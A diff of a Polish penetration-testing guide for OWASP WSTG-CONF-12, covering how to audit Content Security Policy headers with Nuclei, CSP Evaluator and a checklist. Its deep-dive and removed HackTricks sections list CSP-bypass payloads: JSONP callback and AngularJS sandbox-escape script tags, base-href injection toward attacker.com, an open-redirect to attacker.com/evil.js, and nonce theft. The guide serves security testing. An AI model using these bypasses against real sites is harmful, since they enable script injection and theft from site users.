@@ -1,117 +1,104 @@
 # WSTG-CONF-12 — Testing for Content Security Policy
 
-## Cele
+## Cel
 
-- Review CSP header for misconfigurations
-- Identify bypasses in Content Security Policy
-- Assess effectiveness of CSP against XSS and data injection attacks
+Analiza nagłówka Content-Security-Policy: brak CSP, słabe dyrektywy (`unsafe-inline`/`unsafe-eval`/`*`), wildcardy w whitelist hostów, missing `object-src`/`frame-ancestors`/`base-uri`. CSP to last-line-of-defense przeciwko XSS — słaba CSP eliminuje tę ochronę.
 
-## KOMENDY
+## Automatyzacja Nuclei
 
-### cURL - pobranie naglowka CSP
+### Nasz dedykowany szablon
 
 ```bash
-curl -sI https://TARGET | grep -i "Content-Security-Policy" | tee output_csp.txt
-curl -sI https://TARGET | grep -i "Content-Security-Policy-Report-Only" | tee output_csp_report_only.txt
-
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-conf-12-csp.yaml \
+       -proxy http://127.0.0.1:8080 \
+       -o results/wstg-conf-12.jsonl
 ```
 
-### Analiza CSP z roznych stron
+Szablon w jednym requeście z 9 matcherami: brak CSP, tylko Report-Only (no enforcement), `unsafe-inline`, `unsafe-eval`, wildcard w script-src, wildcard w default-src, `data:` w script-src, brak object-src, brak frame-ancestors, JSONP-bypassable hosts (googleapis, jsdelivr).
+
+### Dodatkowe oficjalne szablony Nuclei
 
 ```bash
-curl -sI https://TARGET/ | grep -i "Content-Security-Policy"
-curl -sI https://TARGET/login | grep -i "Content-Security-Policy"
-curl -sI https://TARGET/api/ | grep -i "Content-Security-Policy"
+# Security headers misconfiguration (zawiera CSP)
+nuclei -l burp-export.xml -im burp \
+       -t resources/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml
 
+# Nasz szablon CONF-14 dla pełnego security headers (CSP + reszta)
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-conf-14-security-headers.yaml
 ```
 
-### Sprawdzenie CSP META tag
+### Suplementarne narzędzia (kluczowe dla CSP)
 
 ```bash
-curl -s https://TARGET | grep -iE 'meta.*content-security-policy' | tee output_csp_meta.txt
+# Google CSP Evaluator - pełna analiza
+# https://csp-evaluator.withgoogle.com/
 
+# CSP Evaluator CLI
+csp-evaluator --csp "default-src 'self' 'unsafe-inline'; script-src *"
+
+# Browse to https://csp-scanner.com/ for ready URL test
 ```
 
-### Nmap - naglowki bezpieczenstwa
+## Coverage Matrix
 
-```bash
-nmap --script http-security-headers -p 80,443 TARGET -oN output_nmap_sec_headers.txt
+| Wymiar | Pokryte | Nie pokryte |
+|---|---|---|
+| CSP brak | ✓ | — |
+| Report-Only without enforcing | ✓ | — |
+| unsafe-inline / unsafe-eval | ✓ | — |
+| Wildcard `*` w script-src/default-src | ✓ | — |
+| `data:` jako script source | ✓ | — |
+| Brak object-src | ✓ | — |
+| Brak frame-ancestors | ✓ | — |
+| JSONP bypass-able hosts (googleapis, jsdelivr) | ✓ | dodatkowe → Google CSP Evaluator |
+| Nonce reuse detection | — | wymaga 2 requestów (manual) |
+| strict-dynamic missing dla nonce-CSP | — | manual (false positive risk) |
+| `base-uri` missing | częściowe | osobno → CONF-14 |
 
-```
+## Standard pentesterski — jak to robi się wzorowo
 
-### Nuclei - szablony CSP
+### Metodologia (5 kroków)
 
-```bash
-nuclei -u https://TARGET -tags csp -o output_nuclei_csp.txt
-nuclei -u https://TARGET -tags security-headers -o output_nuclei_headers.txt
+1. **Baseline pull**: GET `/` + ekstrakcja CSP (Content-Security-Policy + Report-Only).
+2. **Google CSP Evaluator**: paste header → analiza per-directive (HIGH/MEDIUM/LOW findings).
+3. **Whitelisted host JSONP analysis**: dla każdego whitelisted host w script-src, sprawdzić znane JSONP endpoints (np. `https://www.googleapis.com/customsearch/v1?callback=alert(1)`).
+4. **Nonce/hash analysis**: jeśli nonce-based CSP, sprawdzić czy nonces są random per request (nie reuse).
+5. **CSP bypass via specific gadgets**: AngularJS sandbox escape, JSONP, base-href injection.
 
-```
+### Co MUSI być sprawdzone (12 punktów)
 
-### Sprawdzenie typowych bledow CSP
-
-```bash
-# NIEBEZPIECZNE dyrektywy:
-# - unsafe-inline (pozwala na inline script/style)
-# - unsafe-eval (pozwala na eval())
-# - * (wildcard - pozwala na wszystko)
-# - data: w script-src (pozwala na data: URI jako script)
-# - brak default-src (brak fallback policy)
-
-```
-
-### Testowanie CSP bypass z znanych CDN
-
-```bash
-# Jesli CSP pozwala na *.googleapis.com, *.cloudflare.com, *.jsdelivr.net
-# mozna hostowac zlosliwy JS na tych domenach
-
-```
-
-### shcheck - sprawdzenie naglowkow bezpieczenstwa
-
-```bash
-shcheck https://TARGET | tee output_shcheck.txt
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-# Brak dedykowanych wordlist - test polega na analizie naglowka CSP
-# Uzyj narzedzi online: https://csp-evaluator.withgoogle.com/
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Sprawdz naglowek CSP w DevTools > Network > Response Headers
-2. Uzyj CSP Evaluator (csp-evaluator.withgoogle.com) do analizy polityki
-3. Szukaj unsafe-inline, unsafe-eval, wildcard (*), data: w script-src
-4. Sprawdz czy CSP jest ustawiony na wszystkich stronach czy tylko na niektorych
-5. Przetestuj bypass CSP: czy dozwolone domeny hostuja kontrolowany content
-6. Sprawdz czy jest Report-Only zamiast enforcing
-7. Zweryfikuj czy CSP blokuje inline scripts i eval()
-8. Przetestuj XSS payload - czy CSP go blokuje
-9. Sprawdz czy base-uri jest ustawiony (ochrona przed base tag injection)
-10. Zweryfikuj czy frame-ancestors jest ustawiony (ochrona przed clickjacking)
-
-
----
+- [ ] CSP header obecny (Content-Security-Policy)
+- [ ] CSP enforcing (nie Report-Only)
+- [ ] `unsafe-inline` w script-src/default-src
+- [ ] `unsafe-eval` w script-src/default-src
+- [ ] Wildcard `*` w script-src
+- [ ] `data:` jako allowed source
+- [ ] Brak object-src 'none' (legacy Flash/Java)
+- [ ] Brak frame-ancestors (clickjacking)
+- [ ] Brak base-uri (base tag injection)
+- [ ] Brak form-action (form hijacking)
+- [ ] JSONP-bypassable hosts (googleapis, jsdelivr, unpkg, jsonp services)
+- [ ] Google CSP Evaluator wynik
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
 > Źródło: OWASP CheatSheetSeries — Content_Security_Policy_Cheat_Sheet.md
 
-### Strict CSP — rekomendowane podejscie
+### Strict CSP — rekomendowane podejście
 
-- **Nonce-based**: `script-src 'nonce-{random}'` — losowy nonce per request, TYLKO skrypty z tym nonce sa wykonywane
-- **Hash-based**: `script-src 'sha256-{hash}'` — TYLKO skrypty z dokladnym hashem sa wykonywane
-- Nonce/hash approach jest SILNIEJSZY niz allowlist domen — eliminuje wiele bypass technik
+- **Nonce-based**: `script-src 'nonce-{random}'` — losowy nonce per request, TYLKO skrypty z tym nonce są wykonywane
+- **Hash-based**: `script-src 'sha256-{hash}'` — TYLKO skrypty z dokładnym hashem są wykonywane
+- Nonce/hash approach jest SILNIEJSZY niż allowlist domen — eliminuje wiele bypass technik
 
 ### Niebezpieczne dyrektywy (UNIKAJ)
 
-- `unsafe-inline` — pozwala na inline `<script>` i `on*` event handlers — czyni XSS mozliwym
-- `unsafe-eval` — pozwala na `eval()`, `Function()`, `setTimeout(string)` — otwiera droge do code injection
-- `*` (wildcard) — pozwala na ladowanie z dowolnej domeny — praktycznie brak ochrony
+- `unsafe-inline` — pozwala na inline `<script>` i `on*` event handlers — czyni XSS możliwym
+- `unsafe-eval` — pozwala na `eval()`, `Function()`, `setTimeout(string)` — otwiera drogę do code injection
+- `*` (wildcard) — pozwala na ładowanie z dowolnej domeny — praktycznie brak ochrony
 - `data:` w `script-src` — pozwala na `<script src="data:text/javascript,alert(1)">`
-- Domeny CDN (`*.googleapis.com`, `*.cloudflare.com`) — atakujacy moze hostowac JS na tych CDN
+- Domeny CDN (`*.googleapis.com`, `*.cloudflare.com`) — atakujący może hostować JS na tych CDN
 
 ### Kluczowe dyrektywy CSP
 
@@ -119,74 +106,71 @@ shcheck https://TARGET | tee output_shcheck.txt
 - `script-src 'nonce-{random}'` — inline skrypty tylko z nonce
 - `style-src 'self'` — CSS tylko z tej samej domeny
 - `img-src 'self' data:` — obrazy z tej samej domeny + data URI
-- `frame-ancestors 'none'` — blokuje iframe embedding (zastepuje X-Frame-Options)
+- `frame-ancestors 'none'` — blokuje iframe embedding (zastępuje X-Frame-Options)
 - `base-uri 'self'` — zapobiega base tag injection
-- `form-action 'self'` — formularze moga byc wysylane tylko na te sama domene
+- `form-action 'self'` — formularze mogą być wysyłane tylko na tę samą domenę
 - `object-src 'none'` — blokuje Flash, Java, inne pluginy
 
-### Wdrozenie CSP
+### Wdrożenie CSP
 
 - **Krok 1**: `Content-Security-Policy-Report-Only` — testuj bez blokowania
-- **Krok 2**: Monitoruj raporty (`report-uri /csp-report`) — identyfikuj co by bylo zablokowane
-- **Krok 3**: Napraw naruszenia (usun inline scripts, uzyj nonce)
-- **Krok 4**: Wlacz enforcing: `Content-Security-Policy` (bez Report-Only)
+- **Krok 2**: Monitoruj raporty (`report-uri /csp-report`) — identyfikuj co by było zablokowane
+- **Krok 3**: Napraw naruszenia (usuń inline scripts, użyj nonce)
+- **Krok 4**: Włącz enforcing: `Content-Security-Policy` (bez Report-Only)
 - Ustaw CSP na WSZYSTKICH stronach — nie tylko na wybranych
 
-### CSP Bypass — co testowac
+### CSP Bypass — co testować
 
-- Czy dozwolone domeny hostuja kontrolowany content (CDN, cloud storage)
-- Czy `unsafe-inline` lub `unsafe-eval` sa wlaczone
+- Czy dozwolone domeny hostują kontrolowany content (CDN, cloud storage)
+- Czy `unsafe-inline` lub `unsafe-eval` są włączone
 - Czy brak `base-uri` (base tag injection)
 - Czy brak `frame-ancestors` (clickjacking)
 - Czy CSP jest Report-Only zamiast enforcing
 
-## ROZSZERZENIA BURP SUITE
+## Pentesterskie deep dive
+
+### Mniej znane techniki
+
+- **JSONP bypass**: `script-src https://www.googleapis.com` → `<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">` wykonuje arbitrary JS. Wszystkie znane JSONP endpoints zebrane na: https://github.com/zigoo0/JSONBee
+- **AngularJS sandbox escape**: jeśli `script-src https://ajax.googleapis.com/ajax/libs/angularjs/`, atakujący ładuje starą wersję Angular z sandbox escape (np. 1.5.x): `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.6/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>`.
+- **base-href injection bez base-uri**: `<base href="//attacker.com/">` zmienia relative URLs → wszystkie relative scripts ładują się z attacker.
+- **CSP nonce reuse**: jeśli ten sam nonce dla GET i POST response → atakujący może replay'ować z dowolnego endpointu.
+- **strict-dynamic + brak nonce w response**: `strict-dynamic` polega na nonce; jeśli nonce missing dla niektórych scripts, są blocked → developers wyłączają strict-dynamic.
+- **CSP via meta tag injection**: jeśli `script-src 'self'` ale aplikacja pozwala na HTML injection w `<head>`, atakujący wstrzykuje `<meta http-equiv="Content-Security-Policy" content="...">` rozluźniając CSP.
+
+### Common pitfalls
+
+- **CSP Report-Only mylony z enforcing**: `Content-Security-Policy-Report-Only` nie blokuje, tylko raportuje. Częste w prod gdy team boi się włączyć enforcing.
+- **CSP w meta tag tylko na pierwszej response**: `<meta http-equiv="CSP">` działa tylko dla initial load — dynamiczne pages bez header są bez ochrony.
+- **CSP nie chroni przed extension injection**: browser extensions mogą injectować skrypty omijając CSP — out-of-scope dla server-side defense.
+
+### Świeżynki z research
+
+- **JSONBee** (kompletna lista CSP-bypass JSONP endpoints): https://github.com/zigoo0/JSONBee
+- **Google CSP Evaluator** (pełna analiza): https://csp-evaluator.withgoogle.com/
+- **CSP-Scanner** (ready URL test): https://csp-scanner.com/
+- **PortSwigger CSP labs**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
+- **HackTricks CSP Bypass**: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
+
+## Rozszerzenia Burp Suite
 
 | Rozszerzenie | Opis | Link |
 |---|---|---|
-| CSP Bypass | Wykrywanie slabosci w konfiguracji Content-Security-Policy | [GitHub](https://github.com/moloch--/CSP-Bypass) |
-| CSP Auditor | Analiza i audyt naglowkow CSP | [GitHub](https://github.com/GoSecure/csp-auditor) |
+| CSP-Auditor | Pasywna analiza CSP w odpowiedziach | community ext |
+| Hackvertor | Decode/test CSP nonces | [GitHub](https://github.com/PortSwigger/hackvertor) |
 
----
+## Źródła
 
-## Wskazówki ASVS
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy
+- OWASP CSP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
+- JSONBee: https://github.com/zigoo0/JSONBee
+- HackTricks CSP Bypass: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
+- PortSwigger CSP: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
-
-### L2 (Standardowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V3.4.3 | Browser Security Mechanism Headers | Verify that HTTP responses include a Content-Security-Policy response header field which defines directives to ensure the browser only loads and executes trusted content or resources, in order to limit execution of malicious JavaScript. As a minimum, a global policy must be used which includes the directives object-src 'none' and base-uri 'none' and defines either an allowlist or uses nonces or hashes. For an L3 application, a per-response policy with nonces or hashes must be defined. |
-| V3.4.6 | Browser Security Mechanism Headers | Verify that the web application uses the frame-ancestors directive of the Content-Security-Policy header field for every HTTP response to ensure that it cannot be embedded by default and that embedding of specific resources is allowed only when necessary. Note that the X-Frame-Options header field, although supported by browsers, is obsolete and may not be relied upon. |
-
-### L3 (Zaawansowany)
+### Wskazówki ASVS
 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
-| V3.4.7 | Browser Security Mechanism Headers | Verify that the Content-Security-Policy header field specifies a location to report violations. |
-
-
----
-
-## HackTricks Tips
-
-### CSP Bypass
-
-- **`unsafe-inline`**: dowolny `<script>alert(1)</script>` działa
-- **`unsafe-eval` + CDN**: load Angular 1.x z `cdnjs.cloudflare.com` → `{{$eval.constructor('alert(1)')()}}`
-- **JSONP na allowed domains**: `<script src="https://www.google.com/complete/search?callback=alert#1">`
-- **Open redirect w whitelisted domain**: `https://www.google.com/amp/s/attacker.com/evil.js`
-- **Third-party abuse**: `*.amazonaws.com`, `*.azurewebsites.net`, `*.firebaseapp.com`, `cdn.jsdelivr.net` → register resource
-- **Nonce reuse**: `document.querySelector("[nonce]").nonce` → inject `<script>` z tym nonce
-- **`strict-dynamic`**: trusted script inject nowy `<script>` → ten też jest trusted
-- **RPO**: `https://example.com/scripts/react/..%2fangular%2fangular.js`
-- **File upload + `'self'`**: upload `.wave` z JS content → include jako `<script src="/uploads/file.wave">`
-- **`form-action` bypass**: `default-src` nie pokrywa `form-action` → inject form na attacker server
-- **`Content-Security-Policy-Report-Only`**: ten header NIE blokuje — CSP not enforced
-
-### CSP via iframe
-
-- `sandbox="allow-scripts allow-same-origin"` to NOT security boundary — iframe może usunąć own sandbox
-- **Nonce theft z same-origin iframe**: `top.document.querySelector('[nonce]').nonce`
-- **`srcdoc` iframe**: same-origin z parent (relative URLs resolve do parent origin)
+| V14.4.3 | Configuration (L1) | CSP set in deny by default and uses nonce or hash. |
+| V14.4.4 | Configuration (L2) | All responses contain a Content-Security-Policy header. |
